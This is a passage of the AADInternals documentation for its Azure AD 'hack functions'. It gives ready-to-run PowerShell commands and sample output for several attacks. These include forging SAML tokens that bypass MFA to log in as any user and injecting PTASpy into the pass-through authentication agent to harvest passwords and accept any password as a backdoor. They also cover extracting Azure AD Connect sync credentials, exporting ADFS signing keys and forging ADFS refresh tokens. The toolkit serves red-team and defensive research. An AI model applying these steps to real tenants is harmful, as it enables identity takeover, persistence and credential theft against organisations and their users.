{{< /highlight>}}

**Output:**
```
Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: yes

Authentication     : Managed
Capabilities       : None
IsDefault          : false
IsInitial          : false
Name               : microsoft.com
RootDomain         : 
Status             : Unverified
VerificationMethod : 

IssuerUri               Domain              
---------               ------              
http://any.sts/B231A11F microsoft.com
```

### Open-AADIntOffice365Portal (*)
This function creates a fake (but valid) WS-Fed/SAML authentication token in .html file and opens it in browser's private or incognito mode. You can choose to use IE, Edge, or Chrome. If Browser parameter is not provided, opens in Edge.
Use any **ImmutableId** from any user from your tenant and the issuer "http://any.sts/B231A11F" you created with <a href="#convertto-aadintbackdoor">ConvertTo-AADIntBackdoor</a>.

Edge and Chrome should log in automatically unless security settings doesn't allow that. If that happens, just click **Allow blocked content** or the button **Login to Office 365** and you're done!
From there, you can also browse to https://portal.azure.com as the same user you just logged in.

**Example:**
{{< highlight powershell >}}
# Login as anyone
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
{{< /highlight>}}

**Output:** (security alert)
![aadint](/images/aadint01.png)

## Hack functions: Pass-through authentication (PTA)

### Set-AADIntPassThroughAuthentication (P)
This function enables or disabled pass through authentication (PTA). 

**Example:**
{{< highlight powershell >}}
# Prompt for credentials and store the token
$pt=Get-AADIntAccessTokenForPTA -Credentials (Get-Credential)
# Disable PTA
Set-AADIntPassThroughAuthentication -AccessToken $pt -Enable $false
{{< /highlight>}}

**Output:**
```
IsSuccesful Enable Exists
----------- ------ ------
true        false  true 
```

### Install-AADIntPTASpy (*)
Since version 0.2.0 <br>
Installs PTASpy to the pass-thru authentication agent on the current computer. **Must be run as Local Admin** on the computer having **Azure AD Authentication Agent** installed and running (AzureADConnectAuthenticationAgentService.exe).

A hidden folder is created (C:\PTASPy) and PTASpy.dll is copied there. PTASpy.dll is then injected to the running AzureADConnectAuthenticationAgentService.
When installed, **PTASpy collects all used credentials** and stores them to C:\PTASpy\PTASpy.csv with Base64 encoded passwords. 
**PTASpy accepts all passwords** so it can be used as a backdoor. 

Use <a href="#get-aadintptaspylog">Get-AADIntPTASpyLog</a> to read the log.

**Example:**
{{< highlight powershell >}}
# Install PTASpy
Install-AADIntPTASpy
{{< /highlight>}}

**Output:**
```
Are you sure you wan't to install PTASpy to this computer? Type YES to continue or CTRL+C to abort: yes
Installation successfully completed!
All passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv
```

### Get-AADIntPTASpyLog (*)
Since version 0.2.0 <br>
Lists the credentials from C:\PTASpy\PTASPy.csv collected by PTASpy

**Example 1:**
{{< highlight powershell >}}
# Show the PTASpy log
Get-AADIntPTASpyLog
{{< /highlight>}}

**Output:**
```
UserName         Password                     Time                
--------         --------                     ----                
user@company.com TQB5AFAAYQBzAHMAdwBvAHIAZAA= 5/22/2019 9:51:43 AM
user@company.com bQBZAHAAQQBTAFMAVwBPAFIARAA= 5/22/2019 9:52:07 AM
```
**Example 2:**
{{< highlight powershell >}}
# Show the PTASpy log with decoded passwords
Get-AADIntPTASpyLog -DecodePasswords
{{< /highlight>}}

**Output:**
```
UserName         Password   Time                
--------         --------   ----                
user@company.com MyPassword 5/22/2019 9:51:43 AM
user@company.com mYpASSWORD 5/22/2019 9:52:07 AM
```

### Remove-AADIntPTASpy (*)
Since version 0.2.0 <br>
Restarts Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent) service and removes PTASpy.

**Example:**
{{< highlight powershell >}}
# Remove PTASpy
Remove-AADIntPTASpy
{{< /highlight>}}

**Output:**
```
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
Service restarted and C:\PTASpy\PTASpy.dll removed.
```


### Register-AADIntPTAAgent (P)
Since version 0.2.8 <br>
Registers a PTA agent to Azure AD with given machine name and creates a client certificate or renews existing certificate. 
The filename of the certificate is **```<server FQDN>_<tenant id>_<agent id>_<cert thumbprint>.pfx```**


After the registration, the certificate and name can be used with Microsoft AzureAD Connect PTA agent (<a href="#set-aadintptacertificate">Set-AADIntPTACertificate</a>)

**Example 1:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForPTA -SaveToCache

# Register a PTA agent
Register-AADIntPTAAgent -MachineName "server1.company.com"
{{< /highlight>}}

**Output:**
```
PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
```
**Example 2:**
{{< highlight powershell >}}
# Update PTA agent certificate
PS C:\>Register-AADIntPTAAgent -MachineName "server1.company.com" -UpdateTrust -PfxFileName .\server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
{{< /highlight>}}

**Output:**
```
PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) certificate renewed for server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_449D42C1BA32B23A621EBE62329AE460FE68924B.pfx
```

### Register-AADIntSyncAgent (P)
Since version 0.2.9 <br>
Registers a sync agent to Azure AD with given machine name and creates a client certificate or renews existing certificate. 
The filename of the certificate is **```<server FQDN>_<tenant id>_<agent id>_<cert thumbprint>.pfx```**


After the registration, the certificate and name can be used with Azure AD Connect <a href="https://docs.microsoft.com/en-us/azure/active-directory/cloud-provisioning/what-is-cloud-provisioning" target="_blank">cloud provisioning agent</a>.

**Example 1:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForPTA -SaveToCache

# Register a Sync agent
Register-AADIntPTAAgent -MachineName "server1.company.com"
{{< /highlight>}}

**Output:**
```
Sync Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
```
**Example 2:**
{{< highlight powershell >}}
# Update Sync agent certificate
PS C:\>Register-AADIntPTAAgent -MachineName "server1.company.com" -UpdateTrust -PfxFileName .\server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
{{< /highlight>}}

**Output:**
```
Sync Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) certificate renewed for server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_449D42C1BA32B23A621EBE62329AE460FE68924B.pfx
```

### Set-AADIntPTACertificate (*)
Since version 0.2.8 <br>
Sets the certificate used by Azure AD Authentication Agent. Can be used to change the name and target tenant of the PTA Agent. 
It changes InstanceID and TenantID registry values at "HKLM:\SOFTWARE\Microsoft\Azure AD Connect Agents\Azure AD Connect Authentication Agent", 
and the certificate thumbprint at "$env:ProgramData\Microsoft\Azure AD Connect Authentication Agent\Config\TrustSettings.xml". 
It also imports the certificate to "Cert:\LocalMachine\My" and gives the "Network Service" read access to it's private key.
Together with PTASpy allows using a standalone server as a backdoor.

**Example:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForPTA -SaveToCache

# Register a PTA agent
Register-AADIntPTAAgent -MachineName "server1.company.com"
{{< /highlight>}}

**Output:**
```
PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
```
{{< highlight powershell >}}
# Change the PTA certificate
Set-AADIntPTACertificate -PfxFileName server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
{{< /highlight>}}

**Output:**
```
Certification information set, remember to restart the service.
```

### Get-AADIntProxyAgents (P)
Since version 0.2.9 <br>
This function shows the list of MS App Proxy authentication (PTA) and provisioning (Azure AD Connect cloud provisioning) agents.

**Example:**
{{< highlight powershell >}}
# Get the access token
$pt=Get-AADIntAccessTokenForPTA

# List the proxy agents
Get-AADIntProxyAgents -AccessToken $pt | ft
{{< /highlight>}}

**Output:**
```
id                                   machineName         externalIp     status   supportedPublishingTypes
--                                   -----------         ----------     ------   ------------------------
51f3afd9-685b-413a-aafa-bab0d556ea4b this.is.a.fake      67.35.155.73   active   {authentication}        
51a061a0-968d-48b8-951e-5ae9d9a0441f server1.company.com 93.188.31.116  inactive {authentication}        
49c9ad46-c067-42f6-a678-dfd938c27789 server2.company.com 102.20.104.213 inactive {provisioning} 
```

### Get-AADIntProxyAgentGroups (P)
Since version 0.2.9 <br>
This function shows the list of MS App Proxy authentication groups of (PTA) and provisioning (Azure AD Connect cloud provisioning) agents.

**Example:**
{{< highlight powershell >}}
# Get the access token
$pt=Get-AADIntAccessTokenForPTA

# List the proxy agents
Get-AADIntProxyAgentGroups -AccessToken $pt | ft
{{< /highlight>}}

**Output:**
```
TenantId                    : ea664074-37dd-4797-a676-b0cf6fdafcd4
ConfigurationDisplayName    : company.com
ConfigurationResourceName   : company.com
ConfigurationPublishingType : provisioning
id                          : 4b6ffe82-bfe2-4357-814c-09da95399da7
displayName                 : Group-company.com-42660f4a-9e66-4a08-ac17-2a2e0d8b993e
publishingType              : provisioning
isDefault                   : False
```

### Export-AADIntProxyAgentCertificates
Since version 0.6.9 <br>
Export certificates of all MS App Proxy agents from the local computer.
The filename of the certificate is **```<server FQDN>_<tenant id>_<agent id>_<cert thumbprint>.pfx```**

**Example 1:**
{{< highlight powershell >}}
# Export certificates
Export-AADIntProxyAgentCertificates
{{< /highlight>}}

**Output:**
```
Certificate saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.pfx
```

**Example 2:**
{{< highlight powershell >}}
# Export certificates
Export-AADIntProxyAgentCertificates -GetBootstrap
{{< /highlight>}}

**Output:**
```
Certificate saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.pfx
Bootstrap saved to:   PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.xml
```

## Hack functions: Directory Synchronization

### Set-AADIntPasswordHashSyncEnabled (A)
Since version 0.1.6 <br>
This function enables or disabled password hash synchronization (PHS).

This can be used to turn on PHS so that passwords can be set using <a href="#set-aadintuserpassword-a">Set-AADIntUserPassword</a>.

**Example:**
{{< highlight powershell >}}
# Enable PHS
Set-AADIntPasswordHashSyncEnabled -Enable $true
{{< /highlight>}}

### New-AADIntGuestInvitation (Z)
This function invites a guest user to tenant. Does not require admin rights, as long as access to Azure Portal is allowed. Basically, this function allows every
member of the tenant to invite guest users to the tenant.

**Example:**
{{< highlight powershell >}}
# Get the auth token. Supports also external users (outlook.com, etc.)
$zt=Get-AADIntAccessTokenForAADIAMAPI -Credentials (Get-Credential)
# Get login information for a domain
New-AADIntGuestInvitation -AuthToken $zt -EmailAddress "someone@outlook.com" -Message "Welcome to our tenant!"
{{< /highlight>}}

**Output:**
```
accountEnabled                        : True
usageLocation                         : 
mailNickname                          : someone_outlook.com#EXT#
passwordProfile                       : 
rolesEntity                           : 
selectedGroupIds                      : 
streetAddress                         : 
city                                  : 
state                                 : 
country                               : 
telephoneNumber                       : 
mobile                                : 
physicalDeliveryOfficeName            : 
postalCode                            : 
authenticationPhoneNumber             : 
authenticationAlternativePhoneNumber  : 
authenticationEmail                   : 
strongAuthenticationDetail            : @{verificationDetail=}
defaultImageUrl                       : 
ageGroup                              : 
consentProvidedForMinor               : 
legalAgeGroupClassification           : 
objectId                              : e250c8f5-3ff3-4eea-9d68-cff019fa850e
objectType                            : User
displayName                           : someone
userPrincipalName                     : someone_outlook.com#EXT#@company.onmicrosoft.com
thumbnailPhoto@odata.mediaContentType : 
givenName                             : 
surname                               : 
mail                                  : someone@outlook.com
dirSyncEnabled                        : 
alternativeSecurityIds                : {}
signInNamesInfo                       : {}
signInNames                           : {someone_outlook.com#EXT#@company.onmicrosoft.com}
ownedDevices                          : 
jobTitle                              : 
department                            : 
displayUserPrincipalName              : 
hasThumbnail                          : False
imageUrl                              : 
imageDataToUpload                     : 
source                                : 
sources                               : 
sourceText                            : 
userFlags                             : 
deletionTimestamp                     : 
permanentDeletionTime                 : 
alternateEmailAddress                 : 
manager                               : 
userType                              : Guest
isThumbnailUpdated                    : 
isAuthenticationContactInfoUpdated    : 
searchableDeviceKey                   : {}
displayEmail                          : 
creationType                          : Invitation
userState                             : PendingAcceptance
otherMails                            : {someone@outlook.com}
```

### Get-AADIntSyncCredentials (*)
Since version 0.1.8 <br>
This function extracts Azure AD Connect credentials to AD and Azure AD from WID database.

**Note:** This function "elevates" the session to ADSync user. You MUST restart PowerShell to restore original rights.

**Example:**
{{< highlight powershell >}}
# Get Azure AD Connect credentials
Get-AADIntSyncCredentials
{{< /highlight>}}

**Output:**
```
Name                           Value
----                           -----
AADUser                        Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com                                                      
AADUserPassword                $.1%(lxZ&/kNZz[r
ADDomain1                      company.com  
ADUser1                        MSOL_4bc4a34e95fa
ADUserPassword1                Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...
ADDomain2                      business.net  
ADUser2                        MSOL_4bc4a34e95fa
ADUserPassword2                cE/Pj+4/MR6hW)2L_4P=H^hiq)pZhMb...
```

### Update-AADIntSyncCredentials (*)
Since version 0.1.8 <br>
This function resets Azure AD Connect credentials to Azure AD and stores it to Azure AD Connect configuration database.

**Note:** This function "elevates" the session to ADSync user. You MUST restart PowerShell to restore original rights.

**Example:**
{{< highlight powershell >}}
# Get the current Azure AD Connect credentials
Get-AADIntSyncCredentials
# Save credentials to a variable
$Cred = Get-Credential -Message "O365" -UserName "Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com"

# Get Access Token
$Token=Get-AADIntAccessTokenForAADGraph -Credentials $Cred

# Update Azure AD Connect credentials for Azure AD
Update-AADIntSyncCredentials -AccessToken $Token
{{< /highlight>}}

**Output:**
```
Password successfully updated to Azure AD and configuration database!

Name                           Value
----                           -----
AADUser                        Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com                                                   
AADUserPassword                Y%C(]u%Rq;en-P;^
ADDomain1                      company.com  
ADUser1                        MSOL_4bc4a34e95fa
ADUserPassword1                Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...

Remember to restart the sync service: Restart-Service ADSync
```

### Get-AADIntSyncEncryptionKeyInfo (*)
Since version 0.3.0 <br>
This function extracts Entropy and InstanceID from the local ADSync configuration database.
Returned information can be used with <a href="#get-aadintsyncencryptionkey">Get-AADIntSyncEncryptionKey</a>.

**Example:**
{{< highlight powershell >}}
# Get the ADSync encryption key info
Get-AADIntSyncEncryptionKeyInfo
{{< /highlight>}}

**Output:**
```
Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
InstanceId                     299b1d83-9dc6-479a-92f1-2357fc5abfed                                                                                                             
Entropy                        a1c80460-6fe9-4c6f-bf31-d7a34c878dca
```

### Get-AADIntSyncEncryptionKey (*)
Since version 0.3.0 <br>
Gets ADSync encryption key using the given entropy and instance id. These can be read from the database or using <a href="#get-aadintsyncencryptionkeyinfo">Get-AADIntSyncEncryptionKeyInfo</a>.

**Example:**
{{< highlight powershell >}}
# Get the key information
$key_info = Get-AADIntSyncEncryptionKeyInfo

# Get the ADSync encryption key 
Get-AADIntSyncEncryptionKey -Entropy $key_info.Entropy -InstanceId $key_info.InstanceId
{{< /highlight>}}

**Output:**
```
Id     Guid                                 CryptAlg Key                   
--     ----                                 -------- ---                   
100000 299b1d83-9dc6-479a-92f1-2357fc5abfed    26128 {4, 220, 54, 13...}
```

## Hack functions: ADFS

### New-AADIntADFSSelfSignedCertificates (*)
Since version 0.2.3 <br>
Disables certificate auto rollover and creates new self-signed Token Signing and Token Decrypt certificates for ADFSService. 
The created certificates are copies of existing certificates, except that they are valid for 10 years. 
Certificates are added to ADFS and the service is restarted. Certificates are also exported to the current directory.


Default password for exported .pfx files is "AADInternals"

**Note!** If there are multiple ADFS servers, certificates MUST be imported to each server's Local Machine Personal store and 
read access to private keys for the ADFS service accounts must be assigned. Also, the ADFS service needs to be restarted.

**Don't forget to update certificate information to Azure AD using <a href="#update-aadintadfsfederationsettings-a">Update-AADIntADFSFederationSettings</a>**

**Example:**
{{< highlight powershell >}}
# Create new certificates
New-AADIntADFSSelfSignedCertificates
{{< /highlight>}}

### Restore-AADIntADFSAutoRollover (*)
Since version 0.2.3 <br>
Restores ADFS to "normal" mode: Token Signing and Token Decryption certificates are automatically rolled over once a year.
Enables certificate auto rollover, updates Token Signing and Token Decryption certificates and removes the old self-signed certificates.

**Note!** If there are multiple ADFS servers the ADFS service needs to be restarted on each server.

**Don't forget to update certificate information to Azure AD using <a href="#update-aadintadfsfederationsettings-a">Update-AADIntADFSFederationSettings</a>**

**Example:**
{{< highlight powershell >}}
# Restore the auto rollover mode
Restore-AADIntADFSAutoRollover
{{< /highlight>}}

### Update-AADIntADFSFederationSettings (A)
Since version 0.2.3 <br>
Updates federation information of the given domain to match the local ADFS server information.

**Example:**
{{< highlight powershell >}}
# Update federation setting for domain company.com
Update-AADIntADFSFederationSettings -Domain company.com
{{< /highlight>}}

### Export-AADIntADFSCertificates (*)
Since version 0.4.7 <br>
Exports current and additional (next) AD FS token signing and encryption certificates to local directory. The exported certificates do not have passwords.

**Example 1:**
{{< highlight powershell >}}
# Export ADFS certificates from the local AD FS server
Export-AADIntADFSCertificates
{{< /highlight>}}

**Example 2:**
{{< highlight powershell >}}
# Export configuration remotely and store to variable
$ADFSConfig = Export-AADIntADFSConfiguration -Hash "6e36047d34057fbb8a4e0ce8933c73cf" -SID "S-1-5-21-1332519571-494820645-211741994-8710" -Server sts.company.com

# Export encryption key remotely and store to variable
$ADFSKey = Export-AADIntADFSEncryptionKey -Server dc.company.com -Credentials $cred -ObjectGuid "930e004a-4486-4f58-aead-268e41c0531e"

# Export ADFS certificates
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $ADFSKey
{{< /highlight>}}

### Export-AADIntADFSConfiguration (*)
Since version 0.4.7 <br>
Exports AD FS configuration from the local AD FS server (local database) or from remote server (ADFS sync).

**Example 1:**
{{< highlight powershell >}}
# Export the configuration from the local database
$config = Export-AADIntADFSConfiguration -Local
{{< /highlight>}}

**Example 2:**
{{< highlight powershell >}}
# Get the AD FS service account guid and sid
Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq sv_ADFS | Format-List Name,ObjectGuid,ObjectSid
{{< /highlight>}}
```
Name       : sv_ADFS
ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
ObjectSid  : S-1-5-21-2918793985-2280761178-2512057791-1134
```
{{< highlight powershell >}}
# Save the credentials with directory replication rights
$creds = Get-Credential

# Get the NTHash of the ADFS service user
$hash = Get-AADIntADUserNTHash -ObjectGuid "b6366885-73f0-4239-9cd9-4f44a0a7bc79" -Credentials $creds -Server dc.company.com -AsHex

# Get the configuration remotely
$configuration = Export-ADFSConfiguration -Hash $hash -SID S-1-5-21-2918793985-2280761178-2512057791-1134 -Server sts.company.com
{{< /highlight>}}

**Example 3:**
{{< highlight powershell >}}
# Export configuration remotely as a logged in user and store to variable
$ADFSConfig = Export-AADIntADFSConfiguration -Server sts.company.com -AsLoggedInUser
{{< /highlight>}}

### Export-AADIntADFSEncryptionKey (*)
Since version 0.4.7 <br>
Exports ADFS configuration encryption Key from the local ADFS server either as a logged-in user or ADFS service account, or remotely using DSR.

**Example 1:**
{{< highlight powershell >}}
# Export the encryption key locally
$key = Export-AADIntADFSEncryptionKey -Local -Configuration $configuration
{{< /highlight>}}

**Example 2:**
{{< highlight powershell >}}
# Save the credentials with directory replication rights
$creds = Get-Credential

# Export the encryption key remotely
$key = Export-AADIntADFSEncryptionKey -Server dc.company.com -Credentials $creds -ObjectGuid 91491383-d748-4163-9e50-9c3c86ad1fbd
{{< /highlight>}}

### Set-AADIntADFSConfiguration (*)
Since version 0.4.8 <br>
Sets configuration of the local AD FS server.

**Example:**
{{< highlight powershell >}}
# Get Policy Store Authorisation Policy rules from the local AD FS
$authPolicy = Get-AADIntADFSPolicyStoreRules

# Get the configuration from the local AD FS server and set read-only policy to allow all to read
$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy

# Set the configuration to the local AD FS database
Set-AADIntADFSConfiguration -Configuration $config
{{< /highlight>}}

### Get-AADIntADFSPolicyStoreRules (*)
Since version 0.4.8 <br>
Gets AD FS PolicyStore Authorisation Policy rules from the given configuration or from local AD FS server.

**Example:**
{{< highlight powershell >}}
# Get Policy Store Authorisation Policy rules from the local AD FS
Get-AADIntADFSPolicyStoreRules | Format-List
{{< /highlight>}}

**Output:**
```
AuthorizationPolicyReadOnly : @RuleName = "Permit Service Account"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                               => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

                              @RuleName = "Permit Local Administrators"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                               => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

AuthorizationPolicy         : @RuleName = "Permit Service Account"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                               => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

                              @RuleName = "Permit Local Administrators"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                               => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
```

### Set-AADIntADFSPolicyStoreRules (*)
Since version 0.4.8 <br>
Sets AD FS PolicyStore Authorisation Policy rules and returns the modified configuration (xml document).
The initial configuration can be provided with -Configuration parameter. If not provided, it will be 
fetched from the local AD FS server.

**Example:**
{{< highlight powershell >}}
# Get Policy Store Authorisation Policy rules from the local AD FS
$authPolicy = Get-AADIntADFSPolicyStoreRules

# Get the configuration from the local AD FS server and set read-only policy to allow all to read
$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy

# Set the configuration to the local AD FS database
Set-AADIntADFSConfiguration -Configuration $config
{{< /highlight>}}


### New-AADIntADFSRefreshToken (*)
Since version 0.6.5 <br>
Creates a new AD FS Refresh Token with the given certificate.

**Example:**
{{< highlight powershell >}}
# Create a new refresh token
$refresh_token = New-AADIntADFSRefreshToken -UserPrincipalName "user@company.com" -Resource "urn:microsoft:userinfo" -Issuer "http://sts.company.com/adfs/services/trust" -PfxFileName_encryption .\ADFS_encryption.pfx -PfxFileName_signing .\ADFS_signing.pfx -ClientID "5846ec9c-1cd7-4040-8630-6ae82d6cdfd3"

# Create a request body
$body=@{
        "client_id"     = "5846ec9c-1cd7-4040-8630-6ae82d6cdfd3"
        "refresh_token" = $refresh_token
        "grant_type"    = "refresh_token"
    }

# Make a http request to AD FS server to fetch the token
$response = Invoke-RestMethod -UseBasicParsing -Uri "https://sts.company.com/adfs/services/trust/adfs/oauth2/token" -Method Post -Body $body
$access_token = $response.access_token
{{< /highlight>}}


### Unprotect-AADIntADFSRefreshToken (*)
Since version 0.6.5 <br>
Decrypts and verifies the given AD FS generated Refresh Token with the given certificates.

The SingleSignOnToken is a deflated binary xml, which is decoded in SSOToken attribute.

**Example:**
{{< highlight powershell >}}
# Decrypt the refresh token
Unprotect-ADFSRefreshToken -RefreshToken $refresh_token -PfxFileName_encryption .\ADFS_encryption.pfx -PfxFileName_signing .\ADFS_signing.pfx
{{< /highlight>}}
**Output:**
```
ClientID           : 5846ec9c-1cd7-4040-8630-6ae82d6cdfd3
RedirectUri        : 
Resource           : urn:microsoft:userinfo
Issuer             : http://sts.company.com/adfs/services/trust
NotBefore          : 1635414030
ExpiresOn          : 1635442830
SingleSignOnToken  : {"TokenType":0,"StringToken":"vVV[redacted]W/gE=","Version":1}
DeviceFlowDeviceId : 
IsDeviceFlow       : False
SessionKeyString   : 
SSOToken           : <SessionToken>[redacted]</SessionToken>
```
**Decoded SingleSignOnToken (SSOToken):**
{{< highlight xml >}}
<SessionToken>
	<Version>1</Version>
	<SecureConversationVersion>http://docs.oasis-open.org/ws-sx/ws-secureconversation/200512</SecureConversationVersion>
	<Id>_7f964293-a538-4d21-9f7f-ff145282b6cb-D8AA6F46060589889967919067D5D6C5</Id>
	<ContextId>urn:uuid:93dfe940-6b96-4ed3-87d0-e34c1fb64782</ContextId>
	<Key>7NBs5rV5S0nDLF04psPMqg==</Key>
	<KeyGeneration>urn:uuid:bb1a61ac-9527-4cd6-9a6d-1a957063deb6</KeyGeneration>
	<EffectiveTime>637710108306674318</EffectiveTime>
	<ExpiryTime>637710396306674318</ExpiryTime>
	<KeyEffectiveTime>637710108306674318</KeyEffectiveTime>
	<KeyExpiryTime>637710396306674318</KeyExpiryTime>
	<ClaimsPrincipal>
		<Identities>
			<Identity NameClaimType="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name" RoleClaimType="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
				<ClaimCollection>
					<Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/implicitupn"             Value="user@company.com"                                                           ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.microsoft.com/claims/authnmethodsproviders"                     Value="FormsAuthentication"                                                        ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationinstant" Value="2021-10-28T09:40:30.618Z"                                                   ValueType="http://www.w3.org/2001/XMLSchema#dateTime"/>
					<Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationmethod"  Value="urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"          ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2014/01/identity/claims/anchorclaimtype"       Value="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname" ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2014/01/identity/claims/accountstore"          Value="AD AUTHORITY"                                                               ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"                     Value="user@company.com"                                                           ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2008/06/identity/claims/primarygroupsid"       Value="S-1-5-21-2918793985-2280761178-2512057791-513"                              ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid"            Value="S-1-5-21-2918793985-2280761178-2512057791-1602"                             ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"                    Value="COMPANY\user"                                                               ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"    Value="COMPANY\user"                                                               ValueType="http://www.w3.org/2001/XMLSchema#string"/>
